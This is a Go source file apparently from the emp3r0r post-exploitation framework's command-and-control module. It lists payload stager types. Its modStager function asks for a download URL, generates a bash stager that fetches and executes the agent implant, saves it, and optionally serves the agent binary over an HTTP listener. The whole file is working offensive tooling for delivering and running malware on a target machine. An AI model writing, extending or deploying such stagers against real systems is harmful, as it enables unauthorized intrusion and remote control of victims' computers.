package cc

import (
	"fmt"
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

var Stagers = []string{
	// generic
	"java",
	"php",
	"python",
	"python3",
	"perl",

	// for Linux
	"linux/bash",

	// for Windows
	"windows/powershell",
	"windows/c#",
}

// modStager generate a stager (to download the actual agent binary and execute it)
func modStager() {
	chosen_stager := Options["type"].Val
	agent_bin_path := Options["agent_path"].Val
	stager_filename := fmt.Sprintf("%s.%s.stager.bin", agent_bin_path, strings.ReplaceAll(chosen_stager, "/", "-"))

	switch chosen_stager {
	case "linux/bash":
		url := CliAsk("Give me an HTTP download URL for agent binary: ", false)
		stager_data := bash_http_downloader(url)
		err = os.WriteFile(stager_filename, stager_data, 0600)
		if err != nil {
			CliPrintError("Failed to save stager data: %v", err)
			return
		}
		CliPrintSuccess("Stager saved as %s:\n%s", stager_filename, stager_data)

		if !CliYesNo("Start an HTTP listner for this stager") {
			return
		}

		// serve agent binary
		go tun.ServeFileHTTP(agent_bin_path, RuntimeConfig.HTTPListenerPort)
	default:
		CliPrintError("%s stager has not been implemented yet", chosen_stager)
	}
}
